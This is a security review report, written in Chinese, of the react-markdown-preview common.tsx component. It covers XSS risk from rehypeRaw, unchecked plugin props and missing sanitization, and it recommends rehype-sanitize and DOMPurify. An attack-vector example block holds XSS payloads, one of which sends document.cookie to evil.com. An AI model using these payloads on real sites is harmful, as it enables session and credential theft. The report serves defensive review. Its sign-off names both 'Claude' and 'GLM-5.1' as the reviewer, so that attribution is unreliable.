# 代码安全评审报告：@uiw/react-markdown-preview/common.tsx

| 项目 | 内容 |
|------|------|
| **文件路径** | `node_modules/@uiw/react-markdown-preview/src/common.tsx` |
| **评审角色** | 代码安全专家 |
| **评审日期** | 2026-05-24 |
| **风险等级** | **B+（中高风险）** |
| **评审结论** | **有条件通过 — 在本项目中使用需额外防护层** |

---

## 一、文件概览

`common.tsx` 是 `@uiw/react-markdown-preview` 库的主入口组件，通过 `React.forwardRef` 导出。其核心职责是组装 rehype 插件管线（pipeline），将 Markdown 文本转换为带语法高亮、代码复制、锚点链接的 HTML 渲染输出。

```tsx
// 插件管线执行顺序
const rehypePlugins: PluggableList = [
  reservedMeta,           // 1. 保留代码块元信息
  rehypeRaw,              // 2. 解析原始 HTML ← 安全关键点
  retrieveMeta,           // 3. 还原代码块元信息
  ...defaultRehypePlugins,// 4. 默认插件（slug/heading/ignore）
  [rehypeRewrite, {...}], // 5. HTML 重写（注入复制按钮/锚点）← 安全关键点
  [rehypeAttrs, {...}],   // 6. 属性解析 ← 安全关键点
  ...(props.rehypePlugins || []), // 7. 外部注入插件 ← 安全关键点
  [rehypePrism, {...}],   // 8. 语法高亮
];
```

---

## 二、威胁建模（STRIDE 分析）

| 威胁类型 | 风险 | 说明 |
|----------|------|------|
| **S**poofing（欺骗） | 中 | 通过 `rehypeRaw` 注入虚假 UI 元素可实施钓鱼 |
| **T**ampering（篡改） | 高 | 外部插件可任意修改渲染树，篡改页面内容 |
| **R**epudiation（抵赖） | 低 | 前端组件，无审计日志需求 |
| **I**nformation Disclosure（信息泄露） | 中 | XSS 可窃取 localStorage 中的 JWT token |
| **D**enial of Service（拒绝服务） | 低 | 超长 markdown 可导致渲染阻塞（已有长度限制缓解） |
| **E**levation of Privilege（提权） | 中 | XSS 可模拟管理员操作 |

---

## 三、安全风险逐项评审

### 风险 1：XSS 通过 rehypeRaw 原始 HTML 注入

- **严重度**：🔴 **严重**
- **CWE**：CWE-79 (Cross-site Scripting)
- **代码位置**：第 18 行 `rehypeRaw`
- **问题描述**：`rehypeRaw` 插件允许 Markdown 中嵌入原始 HTML，包括 `<script>`、`<iframe>`、`<img onerror=...>` 等危险标签。`common.tsx` 未对最终输出做任何 HTML 消毒（sanitization），恶意 Markdown 内容将被直接渲染为 DOM。

```
攻击向量示例：
![xss](https://evil.com/img.png" onerror="alert(document.cookie))
<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
<div onmouseover="alert(1)">hover me</div>
```

- **本项目影响**：`MarkdownViewer.tsx` 使用此组件渲染内容，注释标注"应经过服务端消毒"，但实际代码中**未实施任何客户端消毒**（未使用 DOMPurify，未使用 rehype-sanitize）。如果后端未严格消毒 Markdown 源，XSS 攻击向量将直达用户浏览器。

- **缓解建议**：
  1. 在管线末尾或渲染前添加 `rehype-sanitize` 插件（推荐使用 `rehype-sanitize` 默认 schema）
  2. 在 `MarkdownViewer.tsx` 中使用 DOMPurify 对 `source` 进行预处理
  3. 确保后端存储 Markdown 前进行了严格的输入验证

### 风险 2：外部插件注入（props.rehypePlugins）

- **严重度**：🟠 **高**
- **CWE**：CWE-94 (Code Injection)
- **代码位置**：第 23 行 `...(props.rehypePlugins || [])`
- **问题描述**：`common.tsx` 将调用者传入的 `props.rehypePlugins` 直接展开到插件管线中，无任何白名单校验或沙箱隔离。恶意插件可：
  - 修改整个 AST（抽象语法树），注入任意 HTML
  - 访问 AST 中可能包含的敏感信息
  - 执行任意 JavaScript 逻辑

- **本项目影响**：当前 `MarkdownViewer.tsx` 未传递 `rehypePlugins`，风险暂时可控。但未来如果有开发者传递动态插件，将引入攻击面。

- **缓解建议**：
  1. 如需自定义插件，实施插件白名单机制
  2. 在代码审查中检查所有 `MarkdownViewer`/`MarkdownPreview` 的 `rehypePlugins` prop 使用

### 风险 3：自定义 rehypeRewrite 回调执行

- **严重度**：🟠 **高**
- **CWE**：CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
- **代码位置**：第 21 行 `[rehypeRewrite, { rewrite: rehypeRewriteHandle(props.disableCopy ?? false, props.rehypeRewrite) }]`
- **问题描述**：`rehypeRewriteHandle` 内部将 `props.rehypeRewrite` 回调直接传递给 `rehype-rewrite`，该回调接收完整的 AST 节点引用，可执行任意 DOM 操作。

- **本项目影响**：当前未使用 `rehypeRewrite` prop，风险可控。

- **缓解建议**：禁止传递动态生成的 rewrite 回调。

### 风险 4：rehypeAttrs 属性解析

- **严重度**：🟡 **中**
- **CWE**：CWE-20 (Improper Input Validation)
- **代码位置**：第 22 行 `[rehypeAttrs, { properties: 'attr' }]`
- **问题描述**：`rehype-attr` 从 Markdown 特殊语法中解析 HTML 属性并附加到元素上。配合 `rehypeRaw` 使用时，攻击者可能构造恶意属性值（如 `javascript:` 协议链接），绕过简单的标签过滤。

- **缓解建议**：确保 sanitization 层过滤危险属性（`on*` 事件处理器、`javascript:` 协议、`data:` 协议）。

### 风险 5：无内容安全策略（CSP）集成

- **严重度**：🟡 **中**
- **CWE**：CWE-693 (Protection Mechanism Failure)
- **问题描述**：组件本身不提供任何 CSP 保护。如果宿主应用未配置严格的 CSP 策略，XSS 攻击将畅通无阻。

- **缓解建议**：在服务端 HTTP 响应头中配置严格的 CSP：
  ```
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
  ```

### 风险 6：插件管线顺序问题

- **严重度**：🟡 **中**
- **CWE**：CWE-696 (Incorrect Behavior Order)
- **代码位置**：第 16-25 行
- **问题描述**：`rehypePrism`（语法高亮）位于管线末尾（第 24 行），而外部插件 `props.rehypePlugins` 位于其前（第 23 行）。这意味着：
  1. 外部插件可以修改已经过 rewrite 处理的 HTML，绕过 rewrite 的安全逻辑
  2. 没有"最终消毒"步骤 — 任何后续插件都可以注入恶意内容

- **缓解建议**：在管线最后添加 sanitization 插件作为兜底。

---

## 四、本项目实际风险评估

### 当前使用方式（MarkdownViewer.tsx）

```tsx
<MarkdownPreview
  source={safeSource}        // 仅做了 1MB 长度截断
  wrapperElement={{ 'data-color-mode': 'light' }}
  // 未传递 rehypePlugins / rehypeRewrite — 风险点 2、3 暂不适用
  // 未传递 disableCopy — 使用默认值
/>
```

### 防护现状

| 防护措施 | 状态 | 说明 |
|----------|------|------|
| 长度限制 | ✅ 已实施 | `MAX_SOURCE_LENGTH = 1MB` |
| 客户端 HTML 消毒 | ❌ 未实施 | 依赖"服务端消毒"，但客户端无验证 |
| rehype-sanitize 插件 | ❌ 未使用 | 插件管线中无消毒步骤 |
| DOMPurify | ❌ 未使用 | 项目中有 DOMPurify（ArticleDetail.tsx），但 MarkdownViewer 未使用 |
| CSP 响应头 | ⚠️ 未确认 | 需检查后端 helmet 配置 |

### 综合风险评级

**在本项目中的实际风险：🟠 高** — 若后端存储的 Markdown 内容被恶意篡改（SQL 注入、管理后台被攻破、内部人员恶意操作），将通过 MarkdownViewer 直接在用户浏览器执行 XSS。

---

## 五、修复建议与优先级

| 优先级 | 建议 | 工作量 | 风险降低 |
|--------|------|--------|----------|
| **P0** | 在 `MarkdownViewer.tsx` 中引入 DOMPurify 对 `source` 进行预消毒 | 低 | 高 |
| **P0** | 在 `MarkdownViewer.tsx` 中通过 `rehypePlugins` prop 传入 `rehype-sanitize` | 低 | 高 |
| **P1** | 确认后端 helmet 配置了严格的 CSP 响应头 | 低 | 中 |
| **P1** | 后端 API 对存储的 Markdown 内容进行服务端消毒 | 中 | 高 |
| **P2** | 添加 `allowElement` prop 白名单过滤危险标签 | 低 | 中 |
| **P2** | 在代码审查流程中检查 MarkdownPreview 的所有 prop 使用 | 低 | 中 |

### P0 修复示例代码

```tsx
// MarkdownViewer.tsx — 添加 rehype-sanitize
import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';

<MarkdownPreview
  source={safeSource}
  wrapperElement={{ 'data-color-mode': 'light' }}
  rehypePlugins={[[rehypeSanitize, {
    ...defaultSchema,
    tagNames: [...(defaultSchema.tagNames || []), 'div', 'span'],
    attributes: {
      ...defaultSchema.attributes,
      '*': ['className', 'style'],
    },
  }]]}
/>
```

---

## 六、依赖项安全核查

| 依赖 | 版本 | 已知漏洞 | 说明 |
|------|------|----------|------|
| `rehype-prism-plus` | latest | 无已知高危 | 语法高亮，安全 |
| `rehype-raw` | ^7.0.0 | 无已知漏洞 | 但功能本身引入 XSS 风险 |
| `rehype-rewrite` | latest | 无已知漏洞 | 回调执行需注意 |
| `rehype-attr` | latest | 无已知漏洞 | 属性解析需配合消毒 |
| `rehype-sanitize` | **未安装** | — | **建议安装** |

---

## 七、评审结论

`common.tsx` 作为一个 Markdown 预览库的入口组件，其设计目标是功能完整性（支持原始 HTML、代码高亮、锚点链接），而非安全性。这在库的层面是合理的 — 安全防护应由使用方负责。

**但在本项目中，安全防护层缺失：**

1. `MarkdownViewer.tsx` 仅依赖"服务端消毒"这一单一防线，客户端无任何验证
2. `rehypeRaw` 默认启用，恶意 HTML 可直达 DOM
3. 项目已安装 DOMPurify 但未在 MarkdownViewer 中使用

**评审结论：有条件通过。** 需在 `MarkdownViewer.tsx` 中补充 DOMPurify 或 `rehype-sanitize` 消毒层后方可安全使用。

---

## 八、评审签名

| 项目 | 内容 |
|------|------|
| 评审人 | 代码安全专家（Claude） |
| 评审模型 | GLM-5.1 |
| 评审标准 | OWASP Top 10 / CWE / STRIDE |
